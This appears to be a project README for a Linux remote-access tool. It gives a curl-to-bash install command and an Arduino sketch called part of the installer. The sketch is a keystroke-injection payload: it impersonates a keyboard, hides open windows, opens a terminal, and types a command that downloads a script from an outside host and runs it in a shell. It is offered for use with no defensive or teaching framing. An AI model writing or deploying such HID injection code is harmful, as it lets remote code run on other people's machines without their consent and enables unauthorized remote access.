# Remote Access Software
### the server works for linux (tested on Rosa)
you need to connect to the same network with machine that you're accesing!
Thanks to MitrichevGeorge, who found this project
### Installation
```bash
curl -fsSL https://raw.githubusercontent.com/MitrichevGeorge/mserv/main/install.sh | bash
```
---
This is part of strict installer:
```cpp
#include <Keyboard.h>

#define SCRIPT_URL "https://qpas.netlify.app/i.sh"
const unsigned long KEY_DELAY = 100;

void setup() {
  delay(200);
  Keyboard.begin();

  minimizeAllWindows();
  delay(300);

  openTerminalLinux();
  delay(500);
  typeCommandLinux();
}

void loop() { }

void minimizeAllWindows() {
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  delay(150);
  Keyboard.releaseAll();

  delay(250);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_F12);
  delay(150);
  Keyboard.releaseAll();

  delay(300);
}

void openTerminalLinux() {
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F2);
  delay(200);
  Keyboard.releaseAll();

  delay(300);

  Keyboard.print("konsole");
  delay(KEY_DELAY);
  Keyboard.write(KEY_RETURN);

  delay(500);
}

void typeCommandLinux() {
  String cmd = "curl -sSL " + String(SCRIPT_URL) + " | sh";
  Keyboard.print(cmd);
  delay(KEY_DELAY);
  Keyboard.write(KEY_RETURN);
}
```
